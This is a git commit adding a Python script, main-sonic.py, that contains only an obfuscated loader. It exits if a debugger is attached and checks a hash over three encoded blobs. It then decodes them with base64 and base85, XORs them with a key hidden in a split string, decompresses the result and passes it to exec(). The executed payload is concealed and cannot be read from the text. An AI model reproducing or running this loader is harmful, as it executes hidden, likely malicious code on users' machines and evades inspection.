bd797a42f20d9d35cffd2bf77ebeea729c5ec6e2
GadaLuBau <146705886+GadaLuBau1337@users.noreply.github.com>
2026-03-09 19:03:30 +0700

    Add files via upload

---
+++ main-sonic.py
@@ -0,0 +1,26 @@
+
+import base64,zlib,hashlib,sys,os
+
+if hasattr(sys,'gettrace') and sys.gettrace():
+    os._exit(1)
+
+lrpaPcFi = b'76WTUzGIrCg/arZh+hqd3UHzDGtvg0tuGwwGAr0AAg2jszIdyMnxprMvCEfK/jJy60s++fDLRMSC68MVP8pP1as1wg/nBDE1c/ariQ1EV4qQhCcDHo95pdJwUPABn1a4RfXmK6f1vzfmeXJQwQKteKHKxKbTIjfe//dX8oGvTyDhTT2kuxXDpdu0jyIdcdcRnzjxj8Xv98/jyWe25kW32FBX955OWJziS3cgzbCw5ctRDiGo8TWpr6UGAEORBiDZDqNUupHRsvKPcpAbL57ISgDfilDgV3gAefee7pBuT5v5USf1YXT3WNufvur0nu4zY1nW62NSt0Q1CuY+bAo2myCl1+UqkQ2fYtbcSKsofhtsJjNwhcXJOftmuPWet+14CxHHmT4/SXEtcBpQ9/Kell35RN+31aTKq8oe5cg7VRhvY9P2MXMqSJWSP+VTrSQVRyIFoACg2/gKB0E3vwJO+UP7NNMzDWnnYUj6Z5TuSu1adXFWCUpmCz6djYLEw0WBZ1x/RqR98ZEHhLVTiSjSNETeZlBzxON29CAg8+N7jWwRC0RP5uyu4xBCumK3bXHwj2t90ZRVUfqfPdLcWF2Oxq/utIidFf66trumCNnWQnFlNrsSWUBovYwCUvA/cUeAGzVncuY0FKY0djgFW8dvjW42kgpJ6GfhKEEJx1v29Uv20NyA+QaJt28Yt5msUms15Gblz0Ep8KBYhSMzQEAxr8kn2jliX6oCf43mpZTNtAuB+0yVVmaS7TTcxm2MqIa5xPJwazEzOMVFBZPog88qDqZ8f+tToXXI7AVTaGefKxAPpFwJ6pODLQHl8pCbuD21g7p0ZN9veUKUtVeFRlmASRzAGxmjbPesJ6686Ai8MO/PsKqP/P84OLBOqT4qfv2W8Gq7G1IDdfNG3uIhg8qMVShMLazS7hwOSeOFIyyxNjhSBXeDq8qpZSWISzMw5Ke5TDlOqnc8D6Z1oMaVaIbOAKuJILkDXbSZiDnIQqAHkXP1L4SF6NDdPzkfNhki8L6WlfParOuEVPnXVcCwE8aaugPfDheMndTq2Xn8iyaa398EtddUqoSO6/EkgRsEj4piRqzWqc5HETyLx/0UdI6ylP86LbIii8Ni4IAwhBXk1jtJi7V8glLRmBut3JtWmIFhk+bgrQ=='
+pkZApINK = b'e(Ox?lhGezs->>7p4Gz|&{@Dcd(1S+FL-Ob8G$e|$c~vq?H$C~^oNCai@lTf6Ebt>mjfM>qL>ekNi`4*U{Hh$)AUM>!_rluLTlC7)N<D4mV!PE#(Nt1JS<V;pW_^Kp9)^9<D6*^7xZ3y0i99F;Bp)GphbBfn~Foj+{-#BOqO!t8YvXWsFqc-+XWwBT%z8xZ=V)y0|=<B@oAdbt~W5?av#Crz4PHDTCb8gC)qR!P@WMfrESdDthAI0Y){MR3IYZ-M-#_YJP*FZxi6XF85z|7$+AMfnY^#9H;=mlNF@)f^EY;l9jNqz(F!ZssD7Z?c=P0WP%+wJE(4b41fP^1BlzEKhoyP8fp7v2W>gOxTP>0Tx553&jPj6`!t35e)FIcu+5)qVJXvb*8d(;MFU-(uyV95@)7hjFUe^6Cd4MEuO9=bv@0ur;@#=8CsDt9=)%F&r^_bRSQgIPD!1R@VY9YCC=cWoY$NI<p#@@)N+oA&t#YYr2?@qi^QOTZ=&d7rTb(}metcElpRq7yL&70lnKQ7F5m}R!VnE<~-PsPV4!XGOy7kfhVIq&3x(jibZq_M^>lXOK`4_oPL*fTc{TzdG};4Zua0h!cw7{T)at<z#_zy*5HJKcn80qoKP5vCmy6p(1@v%xthrGP6z190IbYpLfm%Mexp87u}IAEYC-epg|cDAnWF$I1$@Jt-|Dx5m3qTFJ4%_PhIV<o5&k>)3qk_-UU=!ISVMzvPE!^e}S$j&$<viIjZtaXFd;9K|%Yp7gH|`(W2N;nN`0eD&CRtjCi)S%&ag*$aTs{?%=BCG39$EP|bRq&mE(tuTVxNw2Zj_V`S=XabJ2!9zf4KMz#m1Mp=4{Lp}_FbSuj3C>hb@Z$ACWwhp~BA>{WB(5bcHb~=eLmY1Eer&=Xxt6-IrEaaG%={bHRZH0$PQS98#*v-CUO8Ldc87T`oh9&L(jld3%H5Tg9UC{Pv2unH8KC+%2FvE+M<ehH94RZQF12E{fKW(UQfK6PF3bnUAHNA>u_6rpJs(>~^v|NixpvlE@*?DxM7A<zWKRfgj_iU9X}^n(pt2%LGxi_bhE*;R;^D)r+z=fA!0DZCPBVz~'
+UKFYZCWl = b'ydoL40fLebbXujJpORHo86r76Tpj14v4LGARRmZaR8VBt3Ni2f+gIT7BPCikUtQhhNXsUuDJP+LX9gH1lEY/UPxu1eQlRBDaJEkmqtzUw4+zaMS0Vdhmb2VUn+zQtUbIHDEV/Yl0+a3siQmXSqQIcVTzBSHIXJONBhHUYXqOuwmBtzOWCUh0HIRt1YUyMSDUNmL7BHXWtmco0aEgEVHcP1mK1F5YbDns+/kWpkvuv7fN6YII2BHTQGvtkB1l01pzVB4XiwlaLa0bNa6/rf3mZsR5HrL3CVKEYctzgyLrVq/m8k9XAcerZm5OwIx4lxuEcNQkziFSKHB6BBv7c9+HsAPxWdDZO44rn6SSU7gf7fg7vtjJ5/lsTk90EODkj2rvFAD5kcmnB0cifPEdQd6+sPeO/AYAF3jgQrTzwScnM9qjFAGZA11/ym2Mi+1jw564V8tu7hAd1qgAOgLEwZv1uMrIpVIyq7KbStAWVco6sfNw+ConOL7LXf2p5njQP1ZmBMs+K3Iv9o//7IeoaVogukz1OM8sGzKWMp5QRhV2ZrRjB71uT0a1uFgf5y/gQpdWVHvqBnLPkEFJxY6Z4blChzJl1sLfexNes+WMy1fHLeMuy87UFo9wlHAGIkvaMihYuqUDo5jI/0NuwGGn/qZv9Gz4CAnI8b6YnISrI9MyRGHhJKrOSD0kC864mCsY266edMt5JOZDOToOe+4wVlgiuUV+yoOyadIVafQPN0pszHuZFpEz+hqrr6vPZiMX1oHCfywipOnK0FEQ5RAveMdvynNWZ/scM2AZtYKakjKPlSVvcy0caaFCb5qey0l5QyeE3dbCXzNqHkIJyO4jUuWRiaTiPTFI7zvlhGliSheQ+GO0N6POpcldgUgD6shao1DymOyvExw3zWtrNHLCMg/MWMw190lh/maGYSKkzZAnYi1EdCSQV3xcVGehBxMIwKgFIc53VMbCUXktET1PA1SCUGvuHA07fKhlysKNsVc8yoIdK02rWOy30A6JAzJZqlnd5aRX0PfoeFQE5C1DvCMbP22YYniOSrTxD3EWLDhShC95M1w2aehgcrET6OVkS8RpgqG2hMrtyRQ4u8Dnd+/FyMtLgt+qNvuUSAEzuiENJ+EvVghxO+ZsoErSRwO1KcGdynE8CrY='
+TPeXqEgz = "60ce4435afe1784b59d92a7c78626dd48a57bbf90c202c1e87ce2cae706a61b2"
+
+if hashlib.sha256(lrpaPcFi+pkZApINK+UKFYZCWl).hexdigest() != TPeXqEgz:
+    os._exit(1)
+
+_seed = "".join(["UL","TRA","DY","NAM","IC","KEY"])
+_k = hashlib.sha256(_seed.encode()).digest()
+
+_part1 = base64.b64decode(lrpaPcFi)
+_part2 = base64.b85decode(pkZApINK)
+_part3 = base64.b64decode(UKFYZCWl)
+
+_payload = _part1 + _part2 + _part3
+
+_dec = bytes([b ^ _k[i % len(_k)] for i,b in enumerate(_payload)])
+
+exec(zlib.decompress(_dec))
